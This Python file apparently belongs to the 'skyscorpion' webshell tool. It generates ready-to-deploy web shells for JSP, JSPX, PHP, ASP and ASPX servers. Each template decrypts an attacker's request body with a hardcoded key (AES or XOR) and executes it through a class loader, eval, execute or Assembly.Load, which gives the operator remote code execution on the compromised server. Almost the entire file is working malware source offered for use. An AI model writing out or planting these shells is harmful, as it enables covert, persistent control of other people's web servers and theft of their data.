import core.cv as cv

def r(one,r1,r2):
    return one.replace("sky",r1).replace("900bc885d7553375", r2)

def get(type,pwd,pwd_md5):
    print("skyscorpion_20211122 \nhttps://github.com/shack2/skyscorpion\n"+"-"*64)
    if type == "jsp":
        print(r(jsp,pwd,pwd_md5))
    elif type == "jspx":
        print(r(jspx,pwd,pwd_md5))
    elif type == "php":
        print(r(php,pwd,pwd_md5))
    elif type == "asp":
        print(r(asp,pwd,pwd_md5))
    elif type == "aspx" or type == ".net" or type == "c#":
        print(r(aspx,pwd,pwd_md5))

jsp='''api_all_jdk.jsp\n\n<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader {
		U(ClassLoader c) {
			super(c);
		}
		public Class g(byte[] b) {
			return super.defineClass(b, 0, b.length);
		}
	}%>
<%
try{
		String key="900bc885d7553375";
		request.setAttribute("sky", key);
		String data=request.getReader().readLine();
		if (data!= null) {
			String ver = System.getProperty("java.version");
			byte[] code=null;
	        if (ver.compareTo("1.8") >= 0) {
	            Class Base64 = Class.forName("java.util.Base64");
	            Object Decoder = Base64.getMethod("getDecoder", (Class[]) null).invoke(Base64, (Object[]) null);
	            code = (byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data.getBytes("UTF-8")});
	        } else {
	            Class Base64 = Class.forName("sun.misc.BASE64Decoder");
	            Object Decoder = Base64.newInstance();
	            code = (byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{data});
	        }
			Cipher c = Cipher.getInstance("AES");
			c.init(2, new SecretKeySpec(key.getBytes(), "AES"));
			new U(this.getClass().getClassLoader()).g(c.doFinal(code)).newInstance().equals(pageContext);
		}
	}catch(Exception e){
};
out=pageContext.pushBody();
%>'''
jspx='''api_all_jdk.jspx\n\n<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*,java.lang.*"/>
<jsp:declaration>
class U extends ClassLoader {
	U(ClassLoader c) {
		super(c);
	}
	public Class g(byte[] b) {
		return super.defineClass(b, 0, b.length);
	}
}
</jsp:declaration>
<jsp:scriptlet>
try{
		String key="900bc885d7553375";
		request.setAttribute("sky", key);
		String data=request.getReader().readLine();
		if (data!= null) {
			String ver = System.getProperty("java.version");
			byte[] code=null;
	        if (ver.compareTo("1.8") >= 0) {
	            Class Base64 = Class.forName("java.util.Base64");
	            Object Decoder = Base64.getMethod("getDecoder", (Class[]) null).invoke(Base64, (Object[]) null);
	            code = (byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data.getBytes("UTF-8")});
	        } else {
	            Class Base64 = Class.forName("sun.misc.BASE64Decoder");
	            Object Decoder = Base64.newInstance();
	            code = (byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{data});
	        }
			Cipher c = Cipher.getInstance("AES");
			c.init(2, new SecretKeySpec(key.getBytes(), "AES"));
			new U(this.getClass().getClassLoader()).g(c.doFinal(code)).newInstance().equals(pageContext);
		}
	}catch(Exception e){
};
</jsp:scriptlet>
</jsp:root>'''
php='''api.php\n\n<?php
@error_reporting(0);
session_start();
$key="900bc885d7553375";
$_SESSION['k']=$key;
$post=file_get_contents("php://input");
if(isset($post))
{
	$datas=explode("\n",$post);
	$code=$datas[0];
	$t="base64_"."decode";
	$code=$t($code."");
	for($i=0;$i<strlen($code);$i++) {
    	$code[$i] = $code[$i]^$key[$i+1&15]; 
    }
    $arr=explode('|',$code);
    $func=$arr[0];
    if(isset($arr[1])){
 		$p=$arr[1];
		class C{public function __construct($p) {eval($p."");}}
		@new C($p);
    }
}
?>'''
asp='''api.asp\n\n<%
On Error Resume Next
Response.CharSet = "UTF-8"
k="900bc885d7553375"
Session("k")=k
size=Request.TotalBytes
csize=Request.ServerVariables("HTTP_CSIZE")
If IsEmpty(csize)=False Then
	size=CLng(csize)
End If	
If size>0 Then
	content=Request.BinaryRead(size)
	For i=1 To size
		result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
	Next
	execute(result)
End If
%>'''
aspx='''api.aspx\n\n<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%@Import Namespace="System.IO"%>
<%
    try {
        string key = "900bc885d7553375";
        byte[] k = Encoding.Default.GetBytes(key);
        Session.Add("sky", key);
        StreamReader sr = new StreamReader(Request.InputStream);
        string line = sr.ReadLine();
        if (!string.IsNullOrEmpty(line))
        {
            byte[] c = Convert.FromBase64String(line);
            Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this.Context);
            sr.Close();
        }
    }
    catch{ }

%>'''